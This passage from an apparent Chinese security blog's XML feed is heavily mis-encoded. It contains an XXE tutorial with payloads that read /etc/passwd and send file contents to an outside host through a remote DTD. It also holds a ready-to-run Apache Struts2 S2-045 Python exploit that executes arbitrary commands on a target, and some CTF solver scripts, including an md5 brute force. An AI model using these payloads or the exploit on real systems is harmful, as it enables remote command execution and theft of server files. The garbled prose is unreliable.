    <content type="text"><![CDATA[XMLÂü∫Á°Ä‰ºóÊâÄÂë®Áü•ÔºåxmlÂ∏∏Áî®‰∫éÊï∞ÊçÆÂ≠òÂÇ®Âíå‰º†ËæìÔºåÊñá‰ª∂ÂêéÁºÄ‰∏∫ .xmlÔºõÂÆÉÊòØÂèØÊâ©Â±ïÊ†áËÆ∞ËØ≠Ë®ÄÔºàExtensible Markup LanguageÔºåÁÆÄÁß∞XMLÔºâÔºåÊòØ‰∏ÄÁßçÊ†áËÆ∞ËØ≠Ë®Ä„ÄÇXML Ë¢´ËÆæËÆ°‰∏∫‰º†ËæìÂíåÂ≠òÂÇ®Êï∞ÊçÆÔºåÂÖ∂ÁÑ¶ÁÇπÊòØÊï∞ÊçÆÁöÑÂÜÖÂÆπ„ÄÇ 1.‰∏∫‰ªÄ‰πàË¶Å‰ΩøÁî®XML‰∏∫‰∫Ü‰æø‰∫é‰∏çÁî®Â∫îÁî®„ÄÅ‰∏çÂêåÂπ≥Âè∞‰πãÈó¥ÁöÑÊï∞ÊçÆÂÖ±‰∫´ÂíåÈÄö‰ø°„ÄÇ Â¶Ç windows ‰∏élinux Ë∑®Á≥ªÁªü‰∫§‰∫íÁΩëÁ´ô‰∏éÊâãÊú∫APP‰ø°ÊÅØ‰∫§‰∫íËÆ¢Á•®ËΩØ‰ª∂‰∏éÊîØ‰ªòËΩØ‰ª∂Ë∑®Âπ≥Âè∞‰∫§‰∫í 2.XML‰ª£Á†ÅËß£Êûê&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;note&gt; &lt;to&gt;chybeta&lt;/to&gt; &lt;from&gt;ph0en1x&lt;/from&gt; &lt;/note&gt; Âú®‰∏äÈù¢‰ª£Á†Å‰∏≠ÁöÑÁ¨¨‰∏ÄË°åÔºåÂÆö‰πâXMLÁöÑÁâàÊú¨‰∏éÁºñÁ†Å„ÄÇÂú®XMLÊñáÊ°£‰∏≠ÔºåÊâÄÊúâÁöÑÂÖÉÁ¥†ÈÉΩÂøÖÈ°ªÊ≠£Á°ÆÁöÑÂµåÂ•óÔºåÂΩ¢ÊàêÊ†ëÂΩ¢ÁªìÊûÑ„ÄÇÂπ∂‰∏îÊï¥‰∏™XMLÊñáÊ°£‰∏≠ÂøÖÈ°ªË¶ÅÊúâ‰∏Ä ‰∏™Ê†πÂÖÉÁ¥†„ÄÇÂ¶Ç‰∏ä‰ª£Á†ÅÔºåÊòØÊï¥‰∏™ÊñáÊ°£ÁöÑÊ†πÂÖÉÁ¥†„ÄÇÂµåÂ•óÂú®noteÊ†áÁ≠æ‰∏≠ÁöÑÂíåÂàôÊòØ Ê†πÁöÑÂ≠êÂÖÉÁ¥†„ÄÇÂêåÊó∂ÔºåÊâÄÊúâÁöÑXMLÂÖÉÁ¥†ÈÉΩÂøÖÈ°ªÊúâÂÖ≥Èó≠Ê†áÁ≠æÔºåËøôÁÇπ‰∏çÂÉèhtmlËØ≠Ê≥ïÈÇ£Ê†∑ÊùæÊï£„ÄÇÂ¶ÇÊûúÁº∫Â§±ÂÖ≥Èó≠Ê†áÁ≠æÔºåÂàô‰ºöÂØºËá¥XMLËß£ÊûêÂ§±Ë¥•„ÄÇ 3.ËØ≠Ê≥ïËßÑÂàô‚ÄìdtdÊñáÊ°£Á±ªÂûãÂÆö‰πâ(Document Type Definition)ÊòØ‰∏ÄÂ•ó‰∏∫‰∫ÜËøõË°åÁ®ãÂ∫èÈó¥ÁöÑÊï∞ÊçÆ‰∫§Êç¢ËÄåÂª∫Á´ãÁöÑÂÖ≥‰∫éÊ†áËÆ∞Á¨¶ÁöÑËØ≠Ê≥ïËßÑÂàô„ÄÇÂÆÉÊòØÊ†áÂáÜÈÄöÁî®Ê†áËÆ∞ËØ≠Ë®ÄÂíå [1] ÂèØÊâ©Â±ïÊ†áËÆ∞ËØ≠Ë®Ä1.0 ÁâàËßÑÊ†ºÁöÑ‰∏ÄÈÉ®ÂàÜÔºåÊñáÊ°£ÂèØÊ†πÊçÆÊüêÁßçDTDËØ≠Ê≥ïËßÑÂàôÈ™åËØÅÊ†ºÂºèÊòØÂê¶Á¨¶ÂêàÊ≠§ËßÑÂàô„ÄÇÊñáÊ°£Á±ªÂûãÂÆö‰πâ‰πüÂèØÁî®ÂÅö‰øùËØÅÊ†áÂáÜÈÄöÁî®Ê†áËÆ∞ËØ≠Ë®Ä„ÄÅÂèØÊâ©Â±ïÊ†áËÆ∞ËØ≠Ë®ÄÊñáÊ°£Ê†ºÂºèÁöÑÂêàÊ≥ïÊÄßÔºåÂèØ ÈÄöËøáÊØîËæÉÊñáÊ°£ÂíåÊñáÊ°£Á±ªÂûãÂÆö‰πâÊñá‰ª∂Êù•Ê£ÄÊü•ÊñáÊ°£ÊòØÂê¶Á¨¶ÂêàËßÑËåÉÔºåÂÖÉÁ¥†ÂíåÊ†áÁ≠æ‰ΩøÁî®ÊòØÂê¶Ê≠£Á°Æ„ÄÇÊñá‰ª∂ÂÆû‰æãÊèê‰æõÂ∫îÁî®Á®ãÂ∫è‰∏Ä‰∏™Êï∞ÊçÆ‰∫§Êç¢ÁöÑÊ†ºÂºè„ÄÇ‰ΩøÁî®ÂêÑÁ±ªÊñáÊ°£Á±ªÂûãÂÆö‰πâÊòØ‰∏∫‰∫Ü ËÆ©Ê†áÂáÜÈÄöÁî®Ê†áËÆ∞ËØ≠Ë®Ä„ÄÅÂèØÊâ©Â±ïÊ†áËÆ∞ËØ≠Ë®ÄÊñá‰ª∂ËÉΩÁ¨¶ÂêàËßÑÂÆöÁöÑÊï∞ÊçÆ‰∫§Êç¢Ê†áÂáÜÔºåÂõ†‰∏∫ËøôÊ†∑Ôºå‰∏çÂêåÁöÑÂÖ¨Âè∏Âè™ÈúÄÂÆö‰πâÂ•ΩÊ†áÂáÜÊñáÊ°£Á±ªÂûãÂÆö‰πâÔºåÂ∞±ÈÉΩËÉΩ‰æùÊñáÊ°£Á±ªÂûãÂÆö‰πâÂª∫Á´ãÊñáÊ°£ÂÆû ‰æãÔºåÂπ∂‰∏îËøõË°åÈ™åËØÅÔºåÂ¶ÇÊ≠§Â∞±ÂèØ‰ª•ËΩªÊòì‰∫§Êç¢Êï∞ÊçÆÔºåÈò≤Ê≠¢‰∫ÜÂÆû‰æãÊï∞ÊçÆÂÆö‰πâ‰∏çÂêåÁ≠âÂéüÂõ†ÈÄ†ÊàêÁöÑÊï∞ÊçÆ‰∫§Êç¢ÈöúÁ¢çÔºåÊª°Ë∂≥‰∫ÜÁΩëÁªúÂÖ±‰∫´ÂíåÊï∞ÊçÆ‰∫§‰∫í„ÄÇÊñáÊ°£Á±ªÂûãÂÆö‰πâÊñá‰ª∂ÊòØ‰∏Ä‰∏™ÁæéÂõΩ‰ø°ÊÅØ‰∫§Êç¢Ê†áÂáÜ‰ª£Á†ÅÊñáÊú¨Êñá‰ª∂„ÄÇ ÂèÇËÄÉËµÑÊñôÔºöhttps://blog.csdn.net/yeoman92/article/details/53055749 4.ÂÆû‰ΩìÊâÄÊúâÁöÑXMLÊñáÊ°£ÈÉΩÁî±‰∫îÁßçÁÆÄÂçïÁöÑÊûÑÂª∫Ê®°ÂùóÔºàÂÖÉÁ¥†ÔºåÂ±ûÊÄßÔºåÂÆû‰ΩìÔºåPCDATA CDATAÔºâÊûÑÊàê„ÄÇËøôÈáåÁùÄÈáç‰ªãÁªç‰∏Ä‰∏ãÂÆû‰ΩìÔºöÂÆû‰ΩìÊòØÁî®‰∫éÂÆö‰πâÂºïÁî®ÊôÆÈÄöÊñáÊú¨ÊàñÁâπÊÆäÂ≠óÁ¨¶ÁöÑÂø´Êç∑ÊñπÂºèÁöÑÂèòÈáèÔºåÂÆû‰ΩìÂºïÁî®ÊòØÂØπÂÆû‰ΩìÁöÑÂºïÁî®„ÄÇÂÆû‰ΩìÂèØÂú®ÂÜÖÈÉ®ÊàñÂ§ñÈÉ®ËøõË°åÂ£∞ Êòé„ÄÇÂõ†Ê≠§Êàë‰ª¨Âà©Áî®ÂºïÂÖ•ÂÆû‰ΩìÔºåÊûÑÈÄ†ÊÅ∂ÊÑèÂÜÖÂÆπÔºå‰ªéËÄåËææÂà∞ÊîªÂáªÁöÑÁõÆÁöÑ„ÄÇÂÆû‰ΩìÁ±ªÂûãÔºöXMLÂÆû‰ΩìÂàÜ‰∏∫ÂõõÁßçÔºöÂ≠óÁ¨¶ÂÆû‰ΩìÔºåÂëΩÂêçÂÆû‰ΩìÔºåÂ§ñÈÉ®ÂÆû‰ΩìÔºåÂèÇÊï∞ÂÆû‰Ωì„ÄÇ 5.ÊñáÊ°£Á±ªÂûãÂ£∞ÊòéÊñáÊ°£Á±ªÂûãÂÆö‰πâÂèØÂÆö‰πâÂêàÊ≥ïÁöÑXMLÊñáÊ°£ÊûÑÂª∫Ê®°Âùó„ÄÇÂÆÉ‰ΩøÁî®‰∏ÄÁ≥ªÂàóÂêàÊ≥ïÁöÑÂÖÉÁ¥†Êù•ÂÆö‰πâÊñáÊ°£ÁöÑÁªìÊûÑ„ÄÇ‚òÖÂÆÉÂèØË¢´ÊàêË°åÂú∞Â£∞Êòé‰∫é XML ÊñáÊ°£‰∏≠Ôºå‰πüÂèØ‰Ωú‰∏∫‰∏Ä‰∏™Â§ñÈÉ®ÂºïÁî®„ÄÇ //ÊºèÊ¥ûËß¶ÂèëÁÇπÈÄöËøáÂÆÉÔºåÊÇ®ÁöÑÊØè‰∏Ä‰∏™ XML Êñá‰ª∂ÂùáÂèØÊê∫Â∏¶‰∏Ä‰∏™ÊúâÂÖ≥ÂÖ∂Ëá™Ë∫´Ê†ºÂºèÁöÑÊèèËø∞„ÄÇÈÄöËøáÂÆÉÔºåÁã¨Á´ãÁöÑÂõ¢‰ΩìÂèØ‰∏ÄËá¥Âú∞‰ΩøÁî®Êüê‰∏™Ê†áÂáÜÁöÑÊñáÊ°£Á±ªÂûãÂÆö‰πâÊù•‰∫§Êç¢Êï∞ÊçÆ„ÄÇËÄåÊÇ®ÁöÑÂ∫îÁî®Á®ãÂ∫è‰πüÂèØ‰ΩøÁî®Êüê‰∏™Ê†áÂáÜÁöÑÊñáÊ°£Á±ªÂûãÂÆö‰πâÊù•È™åËØÅ‰ªéÂ§ñÈÉ®Êé•Êî∂Âà∞ÁöÑÊï∞ÊçÆ„ÄÇÊÇ®ËøòÂèØ‰ª•‰ΩøÁî®ÂÆÉÊù•È™åËØÅÊÇ®Ëá™Ë∫´ÁöÑÊï∞ÊçÆ„ÄÇ ÂÜÖÈÉ®Â£∞ÊòéÂÅáÂ¶Ç DTD Ë¢´ÂåÖÂê´Âú®ÊÇ®ÁöÑ XML Ê∫êÊñá‰ª∂‰∏≠ÔºåÂÆÉÂ∫îÂΩìÈÄöËøá‰∏ãÈù¢ÁöÑËØ≠Ê≥ïÂåÖË£ÖÂú®‰∏Ä‰∏™ !DOCTYPE Â£∞Êòé‰∏≠Ôºö&lt;!DOCTYPEÊ†πÂÖÉÁ¥† [ÂÖÉÁ¥†Â£∞Êòé]&gt;Â∏¶Êúâ DTD ÁöÑ XML ÊñáÊ°£ÂÆû‰æã &lt;?xmlversion=&quot;1.0&quot;?&gt; &lt;!DOCTYPE note [ &lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!ELEMENT heading (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt; ]&gt; &lt;note&gt; &lt;to&gt;Tove&lt;/to&gt; &lt;from&gt;Jani&lt;/from&gt; &lt;heading&gt;Reminder&lt;/heading&gt; &lt;body&gt;Don&apos;t forget me this weekend&lt;/body&gt; &lt;/note&gt; ‰ª•‰∏ä DTD Ëß£ÈáäÂ¶Ç‰∏ãÔºö!DOCTYPE note (Á¨¨‰∫åË°å)ÂÆö‰πâÊ≠§ÊñáÊ°£ÊòØ note Á±ªÂûãÁöÑÊñáÊ°£„ÄÇ!ELEMENT note (Á¨¨‰∏âË°å)ÂÆö‰πâ note ÂÖÉÁ¥†ÊúâÂõõ‰∏™ÂÖÉÁ¥†Ôºö‚Äùto„ÄÅfrom„ÄÅheading,„ÄÅbody‚Äù!ELEMENT to (Á¨¨ÂõõË°å)ÂÆö‰πâ to ÂÖÉÁ¥†‰∏∫ ‚Äú#PCDATA‚Äù Á±ªÂûã!ELEMENT from (Á¨¨‰∫îË°å)ÂÆö‰πâ from ÂÖÉÁ¥†‰∏∫ ‚Äú#PCDATA‚Äù Á±ªÂûã!ELEMENT heading (Á¨¨ÂÖ≠Ë°å)ÂÆö‰πâ heading ÂÖÉÁ¥†‰∏∫ ‚Äú#PCDATA‚Äù Á±ªÂûã!ELEMENT body (Á¨¨‰∏ÉË°å)ÂÆö‰πâ body ÂÖÉÁ¥†‰∏∫ ‚Äú#PCDATA‚Äù Á±ªÂûã Â§ñÈÉ®Â£∞ÊòéÂÅáÂ¶Ç DTD ‰Ωç‰∫é XML Ê∫êÊñá‰ª∂ÁöÑÂ§ñÈÉ®ÔºåÈÇ£‰πàÂÆÉÂ∫îÈÄöËøá‰∏ãÈù¢ÁöÑËØ≠Ê≥ïË¢´Â∞ÅË£ÖÂú®‰∏Ä‰∏™ DOCTYPE ÂÆö‰πâ‰∏≠ÔºöËøô‰∏™ XML ÊñáÊ°£Âíå‰∏äÈù¢ÁöÑ XML ÊñáÊ°£Áõ∏ÂêåÔºå‰ΩÜÊòØÊã•Êúâ‰∏Ä‰∏™Â§ñÈÉ®ÁöÑ DTD: &lt;?xmlversion=&quot;1.0&quot;?&gt; &lt;!DOCTYPE note SYSTEM&quot;note.dtd&quot;&gt; &lt;note&gt; &lt;to&gt;Tove&lt;/to&gt; &lt;from&gt;Jani&lt;/from&gt; &lt;heading&gt;Reminder&lt;/heading&gt; &lt;body&gt;Don&apos;t forget me this weekend!&lt;/body&gt; &lt;/note&gt;note.dtd Êñá‰ª∂Ôºö &lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!ELEMENT heading (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt;xmlÊºèÊ¥û‚ÄìXXE1.ÊºèÊ¥û‰∫ßÁîüÁöÑÂéüÂõ†XMLÊñá‰ª∂ÁöÑËß£Êûê‰æùËµñlibxmlÂ∫ìÔºåËÄålibxml2.9‰ª•ÂâçÁöÑÁâàÊú¨ÈªòËÆ§ÊîØÊåÅÂπ∂ÂºÄÂêØ‰∫ÜÂ§ñÈÉ®ÂÆû‰ΩìÁöÑÂºïÁî®ÔºåÊúçÂä°Á´ØËß£ÊûêÁî®Êà∑Êèê‰∫§ÁöÑxmlÊñá‰ª∂Êó∂Êú™ÂØπxmlÊñá‰ª∂ ÂºïÁî®ÁöÑÂ§ñÈÉ®ÂÆû‰ΩìÔºàÂê´Â§ñÈÉ®ÊôÆÈÄöÂÆû‰ΩìÂíåÂ§ñÈÉ®ÂèÇÊï∞ÂÆû‰ΩìÔºâÂÅöÂêàÈÄÇÁöÑÂ§ÑÁêÜÔºåÂπ∂‰∏îÂÆû‰ΩìÁöÑURLÊîØÊåÅfile://Âíåphp://Á≠âÂçèËÆÆÔºåÊîªÂáªËÄÖÂèØ‰ª•Âú®xmlÊñá‰ª∂‰∏≠Â£∞Êòé URIÊåáÂêëÊúçÂä°Âô®Êú¨Âú∞ÁöÑÂÆû‰ΩìÈÄ†ÊàêÊîªÂáª„ÄÇ 2.xxeÊú¨Âú∞ÊµãËØïÊúâÂõûÊòæËØªÂèñÊñá‰ª∂windowsÁéØÂ¢É‰∏ã ÊµãËØïPHPÊ∫ê‰ª£Á†Å &lt;?php $data = file_get_contents(&apos;php://input&apos;); $xml = simplexml_load_string($data); echo $xml-&gt;name; ?&gt;Ê≠£Â∏∏Áî®Êà∑Êèê‰∫§‰ª£Á†Å &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt; &lt;user&gt; &lt;name&gt;Striker666666666666&lt;/name&gt; &lt;wechat&gt;strikersb&lt;/wechat&gt; &lt;public_wechat&gt;sec_fe&lt;/public_wechat&gt; &lt;/user&gt; ÊÅ∂ÊÑè‰ª£Á†ÅÊûÑÈÄ†ÔºàÊúâÂõûÊòæÔºâ &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt; //ÂÆÉÂÆö‰πâ XML ÁöÑÁâàÊú¨ (1.0) ÂíåÊâÄ‰ΩøÁî®ÁöÑÁºñÁ†Å )„ÄÇ &lt;!DOCTYPE a [ &lt;!ENTITY aa SYSTEM &quot;file:///D:/1.txt&quot;&gt; ]&gt; //ÂºïÁî®ÂÆû‰Ωìsystem‰∏≠ÁöÑfile ËØªÂèñÊñá‰ª∂„ÄÇ &lt;user&gt; //Ê†πÂÖÉÁ¥†ËØ¥ÊòéÊòØÁî®Êà∑ÁöÑ‰ø°ÊÅØ &lt;name&gt;&amp;b;&lt;/name&gt;//ÂêçÂ≠óÔºåÊ∫ê‰ª£Á†Å‰∏≠ÊÑè‰∏∫ËæìÂá∫nameÊ†áÁ≠æÈáåÁöÑÊï∞ÊçÆÔºå&amp;b Â∞ÜÁ¨¨‰∫åË°å‰∏≠ÁöÑbÂÆû‰ΩìÂåñ„ÄÇÁÑ∂ÂêéÂºïÁî®ÔºåÂà©Áî®fileÂçèËÆÆËØªÂèñCÁõò‰∏ãÁöÑtxtÊñá‰ª∂ &lt;wechat&gt;strikersb&lt;/wechat&gt; &lt;public_wechat&gt;sec_fe&lt;/public_wechat&gt; &lt;website&gt;aaa&lt;/website&gt; &lt;/user&gt; linux Êú¨Âú∞xmlÊµãËØï&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE Anything [ &lt;!ENTITY entityex SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt; &lt;name&gt;&amp;entityex;&lt;/name&gt;ÂèØ‰ª•ËØªÂèñpasswd„ÄÇ Â¶ÇÊûúË¶ÅËØªÂèñphpÊñá‰ª∂ÔºåÂõ†‰∏∫php„ÄÅhtmlÁ≠âÊñá‰ª∂‰∏≠ÊúâÂêÑÁßçÊã¨Âè∑&lt;Ôºå&gt;ÔºåËã•Áõ¥Êé•Áî®fileËØªÂèñ‰ºöÂØºËá¥Ëß£ÊûêÈîôËØØÔºåÊ≠§Êó∂ÂèØ‰ª•Âà©Áî®php://filterÂ∞ÜÂÜÖÂÆπËΩ¨Êç¢‰∏∫base64ÂêéÂÜçËØªÂèñ„ÄÇ Êú¨Âú∞ÊµãËØïÂà©Áî®ÁöÑÊòØ‰∫ëÊúçÂä°Âô®ÔºåÊ≤°ÊúâÂõûÊòæÔºåÊú™ËØªÂèñÊàêÂäüÔºålinux‰∏ãÊú™ÊµãËØïÊàêÂäü„ÄÇ- -„ÄÇ 3.Êú¨Âú∞ÊµãËØïÊó†ÂõûÊòæÊ≥®ÂÖ•ËØªÂèñÊñá‰ª∂&lt;!DOCTYPE a [ &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;&gt; &lt;!ENTITY % dtd SYSTEM &quot;http://www.hackersb.cn/attack.dtd&quot;&gt; %dtd; %mydata; ]&gt; ÂÖ∂‰∏≠attack.dtdÁöÑÂÜÖÂÆπ‰∏∫Ôºö &lt;!ENTITY % all&quot;&lt;!ENTITY &amp;#x25; mydata SYSTEM &quot;http://www.hackersb.cn/?%file&quot;&gt;&quot; //base64Âä†ÂØÜ‰πãÂêéÁÑ∂ÂêéÂ∏¶ÁùÄÂèÇÊï∞ËÆøÈóÆÔºåÂú®Êó•Âøó‰∏≠ÂèØ‰ª•ÁúãÂà∞ ÁºñÁ†Å‰πãÂêéÁöÑÊñá‰ª∂Êï∞ÊçÆ„ÄÇ xmlÈÄ†ÊàêÁöÑssrfÊ≥®ÂÖ•linux Êú¨Âú∞ssrfÊµãËØïÊé¢ÊµãÂºÄÊîæÁ´ØÂè£ Âà©Áî®nc ÂèØÊú¨Âú∞ÊµãËØïÊòØÂê¶ËÉΩÂ§üËøûÊé• windows Êú¨Âú∞ssrfÊé¢ÊµãÂÜÖÁΩëÁ´ØÂè£ÊµãËØï]]></content>
      <tags>
        <tag>Ê∏óÈÄèÊîªÈò≤</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[S2-045ËÑöÊú¨]]></title>
    <url>%2F2018%2F09%2F13%2FS2-045%E6%BC%8F%E6%B4%9E%E8%84%9A%E6%9C%ACcmd%2F</url>
    <content type="text"><![CDATA[#‰∏çBBË¥¥ËÑöÊú¨ #!/usr/bin/python # -*- coding: utf-8 -*- import urllib2 import httplib url=&quot;http://192.168.2.203/login.action&quot; def exploit(url, cmd): payload = &quot;%{(#_=&apos;multipart/form-data&apos;).&quot; payload += &quot;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).&quot; payload += &quot;(#_memberAccess?&quot; payload += &quot;(#_memberAccess=#dm):&quot; payload += &quot;((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).&quot; payload += &quot;(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).&quot; payload += &quot;(#ognlUtil.getExcludedPackageNames().clear()).&quot; payload += &quot;(#ognlUtil.getExcludedClasses().clear()).&quot; payload += &quot;(#context.setMemberAccess(#dm)))).&quot; payload += &quot;(#cmd=&apos;%s&apos;).&quot; % cmd payload += &quot;(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).&quot; payload += &quot;(#cmds=(#iswin?{&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd}:{&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd})).&quot; payload += &quot;(#p=new java.lang.ProcessBuilder(#cmds)).&quot; payload += &quot;(#p.redirectErrorStream(true)).(#process=#p.start()).&quot; payload += &quot;(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).&quot; payload += &quot;(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).&quot; payload += &quot;(#ros.flush())}&quot; try: headers = {&apos;User-Agent&apos;: &apos;Mozilla/5.0&apos;, &apos;Content-Type&apos;: payload} request = urllib2.Request(url, headers=headers) page = urllib2.urlopen(request).read() except httplib.IncompleteRead, e: page = e.partial print(page) return page command=raw_input(&quot;pleace put you command:&quot;) exploit(url,command)ËÑöÊú¨ÊïàÊûúÔºö]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF-pythonÁªÉ‰π†]]></title>
    <url>%2F2018%2F09%2F02%2FCTF-python%2F</url>
    <content type="text"><![CDATA[BUGKU-ÈÄüÂ∫¶Ë¶ÅÂø´È¢òÁõÆÁΩëÂùÄ:http://120.24.86.145:8002/web6/ ÈÄüÂ∫¶Ë¶ÅÂø´ÔºåÊü•ÁúãÊ∫êÁ†ÅÔºåÊöóÁ§∫Ë¶Åpost‰º†ÈÄí‰∏Ä‰∏™ÂèÇÊï∞ÔºåÂÖàÊäìÂåÖÔºåÂèëÁé∞headersÂ§¥ÊúâflagÔºåÈúÄË¶Åbase64Ëß£Á†Å„ÄÇÁÑ∂Âêépost‰º†ÈÄíÂèÇÊï∞ËøîÂõûflag„ÄÇ Ë¥¥Âá∫Ê∫êÁ†ÅÔºö import requests from base64 import b64decode s=requests.Session() #‰øùËØÅ‰∏Ä‰∏™sessionËøôÊ†∑ÊâçËÉΩÊ†πÊçÆÁªôÂá∫ÁöÑÈöèÊú∫flagÂåπÈÖçÊúÄÁªàflag a=s.get(&apos;http://120.24.86.145:8002/web6/&apos;).headers[&apos;flag&apos;] flag=b64decode(a).decode()#Ëß£Á†Åheaders‰∏≠ÁöÑflagÔºå‰ΩÜÊòØËß£Á†ÅÂá∫Êù•ÈúÄË¶ÅdecodeÂÜçÊ¨°Ëß£Á†Å„ÄÇ key=b64decode(flag.split(&apos;:&apos;)[1])#Ëß£Á†ÅÂá∫ÂÜÖÂÆπ‰∏∫ÔºöË∑ëÁöÑËøò‰∏çÈîôÔºåÁªô‰Ω†flagÂêß: ODgzMTc= ÔºåÈúÄË¶ÅÊà™Âèñ:Âè≥ËæπÂÜÖÂÆπÊâÄ‰ª•Áî®Âà∞splitÊà™Âèñ‰ª•ÂÜíÂè∑ÂàÜÂâ≤ÁöÑÁ¨¨‰∫å‰∏™ÂÜÖÂÆπ„ÄÇ payload={&apos;margin&apos;:key} r=s.post(&apos;http://120.24.86.145:8002/web6/&apos;,data=payload) print(r.text)Â§©‰∏ãÊ≠¶ÂäüÂîØÂø´‰∏çÁ†¥È¢òÁõÆÁΩëÂùÄÔºöhttp://ctf5.shiyanbar.com/web/10/10.php Ë¥¥Âá∫Ê∫êÁ†ÅÔºö url=&apos;http://ctf5.shiyanbar.com/web/10/10.php&apos; s=requests.Session()#‰øùËØÅ‰∏Ä‰∏™session‰ºöËØù res=base64.b64decode(s.get(url).headers[&apos;flag&apos;]).decode()#ÂØπflagËøõË°åËß£Á†ÅÁºñÁ†ÅÁ≠âÊìç‰Ωú a=res.split(&apos;:&apos;)[1]#ÂàÜÁ¶ªÂá∫ÈúÄË¶ÅÁöÑ‰ø°ÊÅØ payload={&apos;key&apos;:a} b=s.post(url,data=payload) print(b.text)ÊÄùË∑Ø ÊäìÂåÖ Ê∫êÁ†Å Ëß£Á†Å64 ËÑöÊú¨postÂèëÂåÖ ÁßãÂêçÂ±±ËÄÅÂè∏Êú∫http://120.24.86.145:8002/qiumingshan/ Ë¥¥Âá∫Ê∫êÁ†ÅÔºö url=&apos;http://120.24.86.145:8002/qiumingshan/&apos; s=requests.Session()#‰øùËØÅÂú®ÊûÅÁü≠Êó∂Èó¥ÂÜÖÊèê‰∫§ÊòØ‰∏Ä‰∏™‰ºöËØù r=s.get(url)#get urlÈáåÁöÑË°®ËææÂºè matchp=re.search(r&apos;(\d+[+\-*]+)+\d+&apos;,r.text).group() res=eval(matchp) data={&apos;value&apos;:res} result = s.post(url,data=data) print(result.text)ÂæàÂçïÁ∫ØÁöÑ‰∏ÄÈÅìpythonËÑöÊú¨ËÆ°ÁÆóÈ¢òÁõÆ, Ôºågroup()‰∏∫ÊâìÂç∞Âá∫Ê≠§Ë°®ËææÂºèÁªômatchpÔºåÁî®Ê≠£ÂàôË°®ËææÂºèÔºå\d+Ë°®Á§∫‰∏Ä‰∏™ÊàñËÄÖÂ§ö‰∏™Êï∞Â≠óÔºå[]Èáå‰∏∫‰ªªÊÑè‰∏Ä‰∏™Â≠óÁ¨¶ÔºåËøôÈáå‰∏∫ÂåπÈÖç+-*Ôºå-ÈúÄË¶ÅËΩ¨‰πâÔºåÂ∞ÜËøô‰∏§È°πÊã¨Âè∑Êã¨Ëµ∑Êù•+ÔºåËøôÊ†∑ÊâçÂèØ‰ª•ÂåπÈÖçÂ§ö‰∏™ËøôÊ†∑Á±ªÂûãÁöÑË°®ËææÂºèÔºåÊúÄÂêéÂä†‰∏ä‰∏Ä‰∏™\d+„ÄÇ eval(expression, globals=None, locals=None) ‚Äî ÂÆòÊñπÊñáÊ°£‰∏≠ÁöÑËß£ÈáäÊòØÔºåÂ∞ÜÂ≠óÁ¨¶‰∏≤strÂΩìÊàêÊúâÊïàÁöÑË°®ËææÂºèÊù•Ê±ÇÂÄºÂπ∂ËøîÂõûËÆ°ÁÆóÁªìÊûú„ÄÇglobalsÂíålocalsÂèÇÊï∞ÊòØÂèØÈÄâÁöÑÔºåÂ¶ÇÊûúÊèê‰æõ‰∫ÜglobalsÂèÇÊï∞ÔºåÈÇ£‰πàÂÆÉÂøÖÈ°ªÊòØdictionaryÁ±ªÂûãÔºõÂ¶ÇÊûúÊèê‰æõ‰∫ÜlocalsÂèÇÊï∞ÔºåÈÇ£‰πàÂÆÉÂèØ‰ª•ÊòØ‰ªªÊÑèÁöÑmapÂØπË±°„ÄÇ ÊúÄÂêépost‰º†ÈÄíÂæóÂà∞flagÔºå import hashlib def md5(data): m=hashlib.md5() m.update(data) a=m.hexdigest() return a a=&apos;ichunqiu&apos; b=&apos;abcdefghijklmnopqrstuvwxyz1234567890&apos; for i in b: for j in b: for k in b: for l in b: for m in b: if md5(a+i+j+k+l+m)==&apos;5a2a7d385fdaad3fabbe7b11c28bd48e&apos;: print a+i+j+k+l+mË¶ÅÁ†¥Ëß£ichunqiu ÂêéÈù¢ÁöÑÂêé‰∫î‰ΩçÁÑ∂Âêé post‰º†ÈÄí ‰º†ÈÄÅÈó®ÔºöÊñáÁ´†]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ê≠£ÂàôË°®ËææÂºèÂü∫Á°Ä]]></title>
    <url>%2F2018%2F09%2F02%2F%E6%AD%A3%E5%88%99%E5%9F%BA%E7%A1%80%2F</url>
